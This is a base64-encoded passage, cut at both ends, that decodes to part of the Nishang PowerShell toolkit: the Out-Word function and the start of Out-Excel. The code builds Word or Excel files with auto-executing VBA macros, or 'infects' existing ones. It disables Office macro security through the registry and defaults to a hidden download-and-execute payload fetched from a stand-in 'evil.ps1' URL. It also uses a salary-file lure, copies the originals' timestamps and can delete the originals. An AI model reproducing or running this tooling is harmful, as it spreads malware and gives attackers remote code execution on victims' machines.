V0YWJsZSBtYWNyby4gUG93ZXJzaGVsbCBwYXlsb2Fkcwpjb3VsZCBiZSBleGV1Y3RlZCB1c2luZyB0aGUgZ2VuZXJlYXRlZCBmaWxlcy4gSWYgYSBmb2xkZXIgaXMgcGFzc2VkIHRvIHRoZSBzY3JpcHQgaXQgY2FuIGluc2VydCBtYWNybyBpbiBhbGwgZXhpc3Rpbmcgd29yZApmaWxlcyBpbiB0aGUgZm9sZGVyLiBXaXRoIHRoZSBSZWN1cnNlIHN3aXRjaCwgc3ViLWZvbGRlcnMgY2FuIGFsc28gYmUgaW5jbHVkZWQuIApGb3IgZXhpc3RpbmcgZmlsZXMsIGEgbmV3IG1hY3JvIGVuYWJsZWQgZG9jIGZpbGUgaXMgZ2VuZXJhdGVkIGZyb20gYSBkb2N4IGZpbGUgYW5kIGZvciBleGlzdGluZyAuZG9jIGZpbGVzLCB0aGUgbWFjcm8gY29kZSBpcyBpbnNlcnRlZC4KTGFzdFdyaXRlVGltZSBvZiB0aGUgZG9jeCBmaWxlIGlzIHNldCB0byB0aGUgbmV3bHkgZ2VuZXJhdGVkIGRvYyBmaWxlLiBJZiB0aGUgUmVtb3ZlRG9jeCBzd2l0Y2ggaXMgZW5hYmxlZCwgdGhlIApvcmlnaW5hbCBkb2N4IGlzIHJlbW92ZWQgYW5kIHRoZSBkYXRhIGluIGl0IGlzIGxvc3QuCgouUEFSQU1FVEVSIFBheWxvYWQKUGF5bG9hZCB3aGljaCB5b3Ugd2FudCBleGVjdXRlIG9uIHRoZSB0YXJnZXQuCgouUEFSQU1FVEVSIFBheWxvYWRVUkwKVVJMIG9mIHRoZSBwb3dlcnNoZWxsIHNjcmlwdCB3aGljaCB3b3VsZCBiZSBleGVjdXRlZCBvbiB0aGUgdGFyZ2V0LgoKLlBBUkFNRVRFUiBBcmd1bWVudHMKQXJndW1lbnRzIHRvIHRoZSBwb3dlcnNoZWxsIHNjcmlwdCB0byBiZSBleGVjdXRlZCBvbiB0aGUgdGFyZ2V0LgoKLlBBUkFNRVRFUiBXb3JkRmlsZURpcgpUaGUgZGlyZWN0b3J5IHdoaWNoIGNvbnRhaW5zIE1TIFdvcmQgZmlsZXMgd2hpY2ggYXJlIHRvIGJlICJpbmZlY3RlZCIuCgouUEFSQU1FVEVSIE91dHB1dEZpbGUKVGhlIHBhdGggZm9yIHRoZSBvdXRwdXQgV29yZCBmaWxlLiBEZWZhdWx0IGlzIFNhbGFyeV9EZXRhaWxzLmRvYyBpbiB0aGUgY3VycmVudCBkaXJlY3RvcnkuCgouUEFSQU1FVEVSIFJlY3Vyc2UKUmVjdXJzaXZlbHkgbG9vayBmb3IgV29yZCBmaWxlcyBpbiB0aGUgV29yZEZpbGVEaXIKCi5QQVJBTUVURVIgUmVtb3ZlRG9jeApXaGVuIHVzaW5nIHRoZSBXb3JkRmlsZURpciB0byAiaW5mZWN0IiBmaWxlcyBpbiBhIGRpcmVjdG9yeSwgcmVtb3ZlIHRoZSBvcmlnaW5hbCBvbmVzIGFmdGVyIGNyZWF0aW5nIHRoZSBpbmZlY3RlZCBvbmVzLgoKLlBBUkFNRVRFUiBSZW1haW5TYWZlClVzZSB0aGlzIHN3aXRjaCB0byB0dXJuIG9uIE1hY3JvIFNlY3VyaXR5IG9uIHlvdXIgbWFjaGluZSBhZnRlciB1c2luZyBPdXQtV29yZC4KCi5FWEFNUExFClBTID4gT3V0LVdvcmQgLVBheWxvYWQgInBvd2Vyc2hlbGwuZXhlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1ub3Byb2ZpbGUgLW5vZXhpdCAtYyBHZXQtUHJvY2VzcyIKClVzZSBhYm92ZSBjb21tYW5kIHRvIHByb3ZpZGUgeW91ciBvd24gcGF5bG9hZCB0byBiZSBleGVjdXRlZCBmcm9tIG1hY3JvLiBBIGZpbGUgbmFtZWQgIlNhbGFyeV9EZXRhaWxzLmRvYyIgd291bGQgYmUgZ2VuZXJhdGVkCmluIHRoZSBjdXJyZW50IGRpcmVjdG9yeS4KCi5FWEFNUExFClBTID4gT3V0LVdvcmQgLVBheWxvYWRVUkwgaHR0cDovL3lvdXJ3ZWJzZXJ2ZXIuY29tL2V2aWwucHMxCgpVc2UgYWJvdmUgd2hlbiB5b3Ugd2FudCB0byB1c2UgdGhlIGRlZmF1bHQgcGF5bG9hZCwgd2hpY2ggaXMgYSBwb3dlcnNoZWxsIGRvd25sb2FkIGFuZCBleGVjdXRlIG9uZS1saW5lci4gQSBmaWxlIApuYW1lZCAiU2FsYXJ5X0RldGFpbHMuZG9jIiB3b3VsZCBiZSBnZW5lcmF0ZWQgaW4gdXNlcidzIHRlbXAgZGlyZWN0b3J5LgoKLkVYQU1QTEUKUFMgPiBPdXQtV29yZCAtUGF5bG9hZFVSTCBodHRwOi8veW91cndlYnNlcnZlci5jb20vZXZpbC5wczEgLUFyZ3VtZW50cyBFdmlsCgpVc2UgYWJvdmUgd2hlbiB5b3Ugd2FudCB0byB1c2UgdGhlIGRlZmF1bHQgcGF5bG9hZCwgd2hpY2ggaXMgYSBwb3dlcnNoZWxsIGRvd25sb2FkIGFuZCBleGVjdXRlIG9uZS1saW5lci4KVGhlIEFydWdtZW50IHBhcmFtZXRlciBhbGxvd3MgdG8gcGFzcyBhcmd1bWVudHMgdG8gdGhlIGRvd25sb2FkZWQgc2NyaXB0LgoKLkVYQU1QTEUKUFMgPiBPdXQtV29yZCAtUGF5bG9hZFVSTCBodHRwOi8veW91cndlYnNlcnZlci5jb20vZXZpbC5wczEgLU91dHB1dEZpbGUgQzpcZG9jZmlsZXNcR2VuZXJhdGVkLmRvYwoKSW4gYWJvdmUsIHRoZSBvdXRwdXQgZmlsZSB3b3VsZCBiZSBzYXZlZCB0byB0aGUgZ2l2ZW4gcGF0aC4KCi5FWEFNUExFClBTID4gT3V0LVdvcmQgLVBheWxvYWRVUkwgaHR0cDovL3lvdXJ3ZWJzZXJ2ZXIuY29tL2V2aWwucHMxIC1Xb3JkRmlsZURpciBDOlxkb2NmaWxlc1wKCkluIGFib3ZlLCBpbiB0aGUgQzpcZG9jZmlsZXMgZGlyZWN0b3J5LCBtYWNybyBlbmFibGVkIC5kb2MgZmlsZXMgd291bGQgYmUgY3JlYXRlZCBmb3IgYWxsIHRoZSAuZG9jeCBmaWxlcywgd2l0aCB0aGUgc2FtZSBuYW1lCmFuZCBzYW1lIExhc3QgTU9kaWZpZWQgVGltZS4KCi5FWEFNUExFClBTID4gT3V0LVdvcmQgLVBheWxvYWRVUkwgaHR0cDovL3lvdXJ3ZWJzZXJ2ZXIuY29tL2V2aWwucHMxIC1Xb3JkRmlsZURpciBDOlxkb2NmaWxlc1wgLVJlY3Vyc2UKClRoZSBhYm92ZSBjb21tYW5kIHdvdWxkIHNlYXJjaCByZWN1cnNpdmVseSBmb3IgLmRvY3ggZmlsZXMgaW4gQzpcZG9jZmlsZXMuCgouRVhBTVBMRQpQUyA+IE91dC1Xb3JkIC1QYXlsb2FkVVJMIGh0dHA6Ly95b3Vyd2Vic2VydmVyLmNvbS9ldmlsLnBzMSAtV29yZEZpbGVEaXIgQzpcZG9jZmlsZXNcIC1SZWN1cnNlIC1SZW1vdmVEb2N4CgpUaGUgYWJvdmUgY29tbWFuZCB3b3VsZCBzZWFyY2ggcmVjdXJzaXZlbHkgZm9yIC5kb2N4IGZpbGVzIGluIEM6XGRvY2ZpbGVzLCBnZW5lcmF0ZSBtYWNybyBlbmFibGVkIC5kb2MgZmlsZXMgYW5kCmRlbGV0ZSB0aGUgb3JpZ2luYWwgZmlsZXMuCgouRVhBTVBMRQpQUyA+IE91dC1Xb3JkIC1QYXlsb2FkVVJMIGh0dHA6Ly95b3Vyd2Vic2VydmVyLmNvbS9ldmlsLnBzMSAtUmVtYWluU2FmZQoKT3V0LVdvcmQgdHVybnMgb2ZmIE1hY3JvIFNlY3VyaXR5LiBVc2UgLVJlbWFpblNhZmUgdG8gdHVybiBpdCBiYWNrIG9uLgoKCi5MSU5LCmh0dHA6Ly93d3cubGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLzIwMTQvMTEvcG93ZXJzaGVsbC1mb3ItY2xpZW50LXNpZGUtYXR0YWNrcy5odG1sCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0wLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBheWxvYWQsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0xLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBheWxvYWRVUkwsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MiwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRBcmd1bWVudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0zLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFdvcmRGaWxlRGlyLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249NCwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPdXRwdXRGaWxlPSIkcHdkXFNhbGFyeV9EZXRhaWxzLmRvYyIsCgogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249NSwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZWN1cnNlLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249NiwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZW1vdmVEb2N4LAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTcsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmVtYWluU2FmZQogICAgKQogICAgCiAgICAkV29yZCA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCBXb3JkLkFwcGxpY2F0aW9uCiAgICAkV29yZFZlcnNpb24gPSAkV29yZC5WZXJzaW9uCgogICAgI0NoZWNrIGZvciBPZmZpY2UgMjAwNyBvciBPZmZpY2UgMjAwMwogICAgaWYgKCgkV29yZFZlcnNpb24gLWVxICIxMi4wIikgLW9yICAoJFdvcmRWZXJzaW9uIC1lcSAiMTEuMCIpKQogICAgewogICAgICAgICRXb3JkLkRpc3BsYXlBbGVydHMgPSAkRmFsc2UKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkV29yZC5EaXNwbGF5QWxlcnRzID0gIndkQWxlcnRzTm9uZSIKICAgIH0gICAgCiAgICAjVHVybiBvZmYgTWFjcm8gU2VjdXJpdHkKICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxPZmZpY2VcJFdvcmRWZXJzaW9uXHdvcmRcU2VjdXJpdHkiIC1OYW1lIEFjY2Vzc1ZCT00gLVZhbHVlIDEgLVByb3BlcnR5VHlwZSBEV09SRCAtRm9yY2UgfCBPdXQtTnVsbAogICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVwkV29yZFZlcnNpb25cd29yZFxTZWN1cml0eSIgLU5hbWUgVkJBV2FybmluZ3MgLVZhbHVlIDEgLVByb3BlcnR5VHlwZSBEV09SRCAtRm9yY2UgfCBPdXQtTnVsbAoKICAgIGlmKCEkUGF5bG9hZCkKICAgIHsKICAgICAgICAkUGF5bG9hZCA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgaGlkZGVuIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1ub2xvZ28gLW5vcHJvZmlsZSAtYyBJRVggKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCckUGF5bG9hZFVSTCcpKTskQXJndW1lbnRzIgogICAgfQogICAgI01hY3JvIENvZGUKICAgICNNYWNybyBjb2RlIGZyb20gaGVyZSBodHRwOi8vZW5pZ21hMHgzLndvcmRwcmVzcy5jb20vMjAxNC8wMS8xMS91c2luZy1hLXBvd2Vyc2hlbGwtcGF5bG9hZC1pbi1hLWNsaWVudC1zaWRlLWF0dGFjay8KICAgICRjb2RlID0gQCIKICAgIFN1YiBEb2N1bWVudF9PcGVuKCkKICAgIEV4ZWN1dGUKCiAgICBFbmQgU3ViCgoKICAgICAgICAgUHVibGljIEZ1bmN0aW9uIEV4ZWN1dGUoKSBBcyBWYXJpYW50CiAgICAgICAgICAgIENvbnN0IEhJRERFTl9XSU5ET1cgPSAwCiAgICAgICAgICAgIHN0ckNvbXB1dGVyID0gIi4iCiAgICAgICAgICAgIFNldCBvYmpXTUlTZXJ2aWNlID0gR2V0T2JqZWN0KCJ3aW5tZ210czpcXCIgJiBzdHJDb21wdXRlciAmICJccm9vdFxjaW12MiIpCiAgICAgICAgIAogICAgICAgICAgICBTZXQgb2JqU3RhcnR1cCA9IG9ialdNSVNlcnZpY2UuR2V0KCJXaW4zMl9Qcm9jZXNzU3RhcnR1cCIpCiAgICAgICAgICAgIFNldCBvYmpDb25maWcgPSBvYmpTdGFydHVwLlNwYXduSW5zdGFuY2VfCiAgICAgICAgICAgIG9iakNvbmZpZy5TaG93V2luZG93ID0gSElEREVOX1dJTkRPVwogICAgICAgICAgICBTZXQgb2JqUHJvY2VzcyA9IEdldE9iamVjdCgid2lubWdtdHM6XFwiICYgc3RyQ29tcHV0ZXIgJiAiXHJvb3RcY2ltdjI6V2luMzJfUHJvY2VzcyIpCiAgICAgICAgICAgIG9ialByb2Nlc3MuQ3JlYXRlICIkUGF5bG9hZCIsIE51bGwsIG9iakNvbmZpZywgaW50UHJvY2Vzc0lECiAgICAgICAgIEVuZCBGdW5jdGlvbgoiQAoKICAKICAgIGlmICgkV29yZEZpbGVEaXIpCiAgICB7CiAgICAgICAgJFdvcmRGaWxlcyA9IEdldC1DaGlsZEl0ZW0gJFdvcmRGaWxlRGlyXCogLUluY2x1ZGUgKi5kb2MsKi5kb2N4CiAgICAgICAgaWYgKCRSZWN1cnNlIC1lcSAkVHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICRXb3JkRmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1SZWN1cnNlICRXb3JkRmlsZURpclwqIC1JbmNsdWRlICouZG9jLCouZG9jeAogICAgICAgIH0KICAgICAgICBGb3JFYWNoICgkV29yZEZpbGUgaW4gJFdvcmRGaWxlcykKICAgICAgICB7CiAgICAgICAgICAgICRXb3JkID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdvcmQuQXBwbGljYXRpb24KICAgICAgICAgICAgJFdvcmQuRGlzcGxheUFsZXJ0cyA9ICRGYWxzZQogICAgICAgICAgICAkRG9jID0gJFdvcmQuRG9jdW1lbnRzLk9wZW4oJFdvcmRGaWxlLkZ1bGxOYW1lKQogICAgICAgICAgICAkRG9jTW9kdWxlID0gJERvYy5WQlByb2plY3QuVkJDb21wb25lbnRzLkl0ZW0oMSkKICAgICAgICAgICAgJERvY01vZHVsZS5Db2RlTW9kdWxlLkFkZEZyb21TdHJpbmcoJGNvZGUpCiAgICAgICAgICAgIGlmICgkV29yZEZpbGUuRXh0ZW5zaW9uIC1lcSAiLmRvYyIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTYXZlcGF0aCA9ICRXb3JkRmlsZS5GdWxsTmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgICRTYXZlcGF0aCA9ICRXb3JkRmlsZS5EaXJlY3RvcnlOYW1lICsgIlwiICsgJFdvcmRmaWxlLkJhc2VOYW1lICsgIi5kb2MiCiAgICAgICAgICAgICNBcHBlbmQgLmRvYyB0byB0aGUgb3JpZ2luYWwgZmlsZSBuYW1lIGlmIGZpbGUgZXh0ZW5zaW9ucyBhcmUgaGlkZGVuIGZvciBrbm93biBmaWxlIHR5cGVzLgogICAgICAgICAgICBpZiAoKEdldC1JdGVtUHJvcGVydHkgSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcQWR2YW5jZWQpLkhpZGVGaWxlRXh0IC1lcSAiMSIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTYXZlcGF0aCA9ICRXb3JkRmlsZS5GdWxsTmFtZSArICIuZG9jIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgoJFdvcmRWZXJzaW9uIC1lcSAiMTIuMCIpIC1vciAgKCRXb3JkVmVyc2lvbiAtZXEgIjExLjAiKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJERvYy5TYXZlYXMoJFNhdmVQYXRoLCAwKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJERvYy5TYXZlYXMoW3JlZl0kU2F2ZVBhdGgsIDApCiAgICAgICAgICAgIH0gCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiU2F2ZWQgdG8gZmlsZSAkU2F2ZVBhdGgiCiAgICAgICAgICAgICREb2MuQ2xvc2UoKQogICAgICAgICAgICAkTGFzdE1vZGlmeVRpbWUgPSAkV29yZEZpbGUuTGFzdFdyaXRlVGltZQogICAgICAgICAgICAkRmluYWxEb2MgPSBHZXQtQ2hpbGRJdGVtICRTYXZlcGF0aAogICAgICAgICAgICAkRmluYWxEb2MuTGFzdFdyaXRlVGltZSA9ICRMYXN0TW9kaWZ5VGltZQogICAgICAgICAgICBpZiAoJFJlbW92ZURvY3ggLWVxICRUcnVlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkRlbGV0aW5nICQoJFdvcmRGaWxlLkZ1bGxOYW1lKSIKICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICRXb3JkRmlsZS5GdWxsTmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgICRXb3JkLnF1aXQoKQogICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcHNlcnZpY2VzLk1hcnNoYWxdOjpSZWxlYXNlQ29tT2JqZWN0KCRXb3JkKQogICAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkRG9jID0gJFdvcmQuZG9jdW1lbnRzLmFkZCgpCiAgICAgICAgJERvY01vZHVsZSA9ICREb2MuVkJQcm9qZWN0LlZCQ29tcG9uZW50cy5JdGVtKDEpCiAgICAgICAgJERvY01vZHVsZS5Db2RlTW9kdWxlLkFkZEZyb21TdHJpbmcoJGNvZGUpCiAgICAgICAgaWYgKCgkV29yZFZlcnNpb24gLWVxICIxMi4wIikgLW9yICAoJFdvcmRWZXJzaW9uIC1lcSAiMTEuMCIpKQogICAgICAgIHsKICAgICAgICAgICAgJERvYy5TYXZlYXMoJE91dHB1dEZpbGUsIDApCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICREb2MuU2F2ZWFzKFtyZWZdJE91dHB1dEZpbGUsIFtyZWZdMCkKICAgICAgICB9IAogICAgICAgIFdyaXRlLU91dHB1dCAiU2F2ZWQgdG8gZmlsZSAkT3V0cHV0RmlsZSIKICAgICAgICAkRG9jLkNsb3NlKCkKICAgICAgICAkV29yZC5xdWl0KCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcHNlcnZpY2VzLk1hcnNoYWxdOjpSZWxlYXNlQ29tT2JqZWN0KCRXb3JkKQogICAgfQoKICAgIGlmICgkUmVtYWluU2FmZSAtZXEgJFRydWUpCiAgICB7CiAgICAgICAgI1R1cm4gb24gTWFjcm8gU2VjdXJpdHkKICAgICAgICBOZXctSXRlbVByb3BlcnR5IC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcT2ZmaWNlXCRXb3JkVmVyc2lvblx3b3JkXFNlY3VyaXR5IiAtTmFtZSBBY2Nlc3NWQk9NIC1WYWx1ZSAwIC1Gb3JjZSB8IE91dC1OdWxsCiAgICAgICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVwkV29yZFZlcnNpb25cd29yZFxTZWN1cml0eSIgLU5hbWUgVkJBV2FybmluZ3MgLVZhbHVlIDAgLUZvcmNlIHwgT3V0LU51bGwKICAgIH0KfQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjT3V0LUV4Y2VsIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpmdW5jdGlvbiBPdXQtRXhjZWwKewoKPCMKLlNZTk9QU0lTCk5pc2hhbmcgU2NyaXB0IHdoaWNoIGNhbiBnZW5lcmF0ZSBhbmQgImluZmVjdCIgZXhpc3RpbmcgZXhjZWwgZmlsZXMgd2l0aCBhbiBhdXRvIGV4ZWN1dGFibGUgbWFjcm8uIAoKLkRFU0NSSVBUSU9OClRoZSBzY3JpcHQgY2FuIGNyZWF0ZSBhcyB3ZWxsIGFzICJpbmZlY3QiIGV4aXN0aW5nIGV4Y2VsIGZpbGVzIHdpdGggYW4gYXV0byBleGVjdXRhYmxlIG1hY3JvLiBQb3dlcnNoZWxsIHBheWxvYWRzCmNvdWxkIGJlIGV4ZXVjdGVkIHVzaW5nIHRoZSBnZW5lcmVhdGVkIGZpbGVzLiBJZiBhIGZvbGRlciBpcyBwYXNzZWQgdG8gdGhlIHNjcmlwdCBpdCBjYW4gaW5zZXJ0IG1hY3JvIGluIGFsbCBleGlzdGluZyBleGNybApmaWxlcyBpbiB0aGUgZm9sZGVyLiBXaXRoIHRoZSBSZWN1cnNlIHN3aXRjaCwgc3ViLWZvbGRlcnMgY2FuIGFsc28gYmUgaW5jbHVkZWQuIApGb3IgZXhpc3RpbmcgZmlsZXMsIGEgbmV3IG1hY3JvIGVuYWJsZWQgeGxzIGZpbGUgaXMgZ2VuZXJhdGVkIGZyb20gYSB4bHN4IGZpbGUgYW5kIGZvciBleGlzdGluZyAueGxzIGZpbGVzLCB0aGUgbWFjcm8gY29kZSBpcyBpbnNlcnRlZC4KTGFzdFdyaXRlVGltZSBvZiB0aGUgeGxzeCBmaWxlIGlzIHNldCB0byB0aGUgbmV3bHkgZ2VuZXJhdGVkIHhscyBmaWxlLiBJZiB0aGUgUmVtb3ZlWGxzeCBzd2l0Y2ggaXMgZW5hYmxlZCwgdGhlIApvcmlnaW5hbCB4bHN4IGlzIHJlbW92ZWQgYW5kIHRoZSBkYXRhIGluIGl0IGlzIGxvc3QuCgouUEFSQU1FVEVSIFBheWxvYWQKUGF5bG9hZCB3aGljaCB5b3Ugd2FudCBleGVjdXRlIG9uIHRoZSB0YXJnZXQuCgouUEFSQU1FVEVSIFBheWxvYWRVUkwKVVJMIG9mIHRoZSBwb3dlcnNoZWxsIHNjcmlwdCB3aGljaCB3b3VsZCBiZSBleGVjdXRlZCBvbiB0aGUgdGFyZ2V0LgoKLlBBUkFNRVRFUiBBcmd1bWVudHMKQXJndW1lbnRzIHRvIHRoZSBwb3dlcnNoZWxsIHNjcmlwdCB0byBiZSBleGVjdXRlZCBvbiB0aGUgdGFyZ2V0LgoKLlBBUkFNRVRFUiBFeGNlbEZpbGVEaXIKVGhlIGRpcmVjdG9yeSB3aGljaCBjb250YWlucyBNUyBFeGNlbCBmaWxlcyB3aGljaCBhcmUgdG8gYmUgImluZmVjdGVkIi4KCi5QQVJBTUVURVIgT3V0cHV0RmlsZQpUaGUgcGF0aCBmb3IgdGhlIG91dHB1dCBFeGNlbCBmaWxlLiBEZWZhdWx0IGlzIFNhbGFyeV9EZXRhaWxzLnhscyBpbiB0aGUgY3VycmVudCBkaXJlY3RvcnkuCgouUEFSQU1FVEVSIFJlY3Vyc2UKUmVjdXJzaXZlbHkgbG9vayBmb3IgRXhjZWwgZmlsZXMgaW4gdGhlIEV4Y2VsRmlsZURpcgoKLlBBUkFNRVRFUiBSZW1vdmVYbHN4CldoZW4gdXNpbmcgdGhlIEV4Y2VsRmlsZURpciB0byAiaW5mZWN0IiBmaWxlcyBpbiBhIGRpcmVjdG9yeSwgcmVtb3ZlIHRoZSBvcmlnaW5hbCBvbmVzIGFmdGVyIGNyZWF0aW5nIHRoZSBpbmZlY3RlZCBvbmVzLgoKLlBBUkFNRVRFUiBSZW1haW5TYWZlClVzZSB0aGlzIHN3aXRjaCB0byB0dXJuIG9uIE1hY3JvIFNlY3VyaXR5IG9uIHlvdXIgbWFjaGluZSBhZnRlciB1c2luZyBPdXQtRXhjZWwuCgouRVhBTVBMRQpQUyA+IE91dC1FeGNlbCAtUGF5bG9hZCAicG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLW5vcHJvZmlsZSAtbm9leGl0IC1jIEdldC1Qcm9jZXNzIgoKVXNlIGFib3ZlIGNvbW1hbmQgdG8gcHJvdmlkZSB5b3VyIG93biBwYXlsb2FkIHRvIGJlIGV4ZWN1dGVkIGZyb20gbWFjcm8uIEEgZmlsZSBuYW1lZCAiU2FsYXJ5X0RldGFpbHMueGxzIiB3b3VsZCBiZSBnZW5lcmF0ZWQKaW4gdXNlcidzIHRlbXAgZGlyZWN0b3J5LgoKLkVYQU1QTEUKUFMgPiBPdXQtRXhjZWwgLVBheWxvYWRVUkwgaHR0cDovL3lvdXJ3ZWJzZXJ2ZXIuY29tL2V2aWwucHMxCgpVc2UgYWJvdmUgd2hlbiB5b3Ugd2FudCB0byB1c2UgdGhlIGRlZmF1bHQgcGF5bG9hZCwgd2hpY2ggaXMgYSBwb3dlcnNoZWxsIGRvd25sb2FkIGFuZCBleGVjdXRlIG9uZS1saW5lci4gQSBmaWxlIApuYW1lZCAiU2FsYXJ5X0RldGFpbHMueGxzIiB3b3VsZCBiZSBnZW5lcmF0ZWQgaW4gdXNlcidzIHRlbXAgZGlyZWN0b3J5LgoKLkVYQU1QTEUKUFMgPiBPdXQtRXhjZWwgLVBheWxvYWRVUkwgaHR0cDovL3lvdXJ3ZWJzZXJ2ZXIuY29tL2V2aWwucHMxIC1Bcmd1bWVudHMKClVzZSBhYm92ZSB3aGVuIHlvdSB3YW50IHRvIHVzZSB0aGUgZGVmYXVsdCBwYXlsb2FkLCB3aGljaCBpcyBhIHBvd2Vyc2hlbGwgZG93bmxvYWQgYW5kIGV4ZWN1dGUgb25lLWxpbmVyLgpUaGUgQXJ1Z21lbnQgcGFyYW1ldGVyIGFsbG93cyB0byBwYXNzIGFyZ3VtZW50cyB0byB0aGUgZG93bmxvYWRlZCBzY3JpcHQuCgouRVhBTVBMRQpQUyA+IE91dC1FeGNlbCAtUGF5bG9hZFVSTCBodHRwOi8veW91cndlYnNlcnZlci5jb20vZXZpbC5wczEgLU91dHB1dEZpbGUgQzpceGxzZmlsZXNcR2VuZXJhdGVkLnhscwoKSW4gYWJvdmUsIHRoZSBvdXRwdXQgZmlsZSB3b3VsZCBiZSBzYXZlZCB0byB0aGUgZ2l2ZW4gcGF0aC4KCi5FWEFNUExFClBTID4gT3V0LUV4Y2VsIC1QYXlsb2FkVVJMIGh0dHA6Ly95b3Vyd2Vic2VydmVyLmNvbS9ldmlsLnBzMSAtRXhjZWxGaWxlRGlyIEM6XHhsc2ZpbGVzXAoKSW4gYWJvdmUsIGluIHRoZSBDOlx4bHNmaWxlcyBkaXJlY3RvcnksIG1hY3JvIGVuYWJsZWQgLnhscyBmaWxlcyB3b3VsZCBiZSBjcmVhdGVkIGZvciBhbGwgdGhlIC54bHN4IGZpbGVzLCB3aXRoIHRoZSBzYW1lIG5hbWUKYW5kIHNhbWUgTGFzdCBNT2RpZmllZCBUaW1lLgoKLkVYQU1QTEUKUFMgPiBPdXQtRXhjZWwgLVBheWxvYWRVUkwgaHR0cDovL3lvdXJ3ZWJzZXJ2ZXIuY29tL2V2aWwucHMxIC1FeGNlbEZpbGVEaXIgQzpceGxzZmlsZXNcIC1SZWN1cnNlCgpUaGUgYWJvdmUgY29tbWFuZCB3b3VsZCBzZWFyY2ggcmVjdXJzaXZlbHkgZm9yIC54bHN4IGZpbGVzIGluIEM6XHhsc2ZpbGVzLgoKLkVYQU1QTEUKUFMgPiBPdXQtRXhjZWwgLVBheWxvYWRVUkwgaHR0cDovL3lvdXJ3ZWJzZXJ2ZXIuY29tL2V2aWwucHMxIC1FeGNlbEZpbGVEaXIgQzpceGxzZmlsZXNcIC1SZWN1cnNlIC1SZW1vdmVYbHN4CgpUaGUgYWJvdmUgY29tbWFuZCB3b3VsZCBzZWFyY2ggcmVjdXJzaXZlbHkgZm9yIC54bHN4IGZpbGVzIGluIEM6XHhsc2ZpbGVzLCBnZW5lcmF0ZSBtYWNybyBlbmFibGVkIC54bHMgZmlsZXMgYW5kCmRlbGV0ZSB0aGUgb3JpZ2luYWwgZmlsZXMuCgouRVhBTVBMRQpQUyA+IE91dC1FeGNlbCAtUGF5bG9hZFVSTCBodHRwOi8veW91cndlYnNlcnZlci5jb20vZXZpbC5wczEgLVJlbWFpblNhZmUKCk91dC1FeGNlb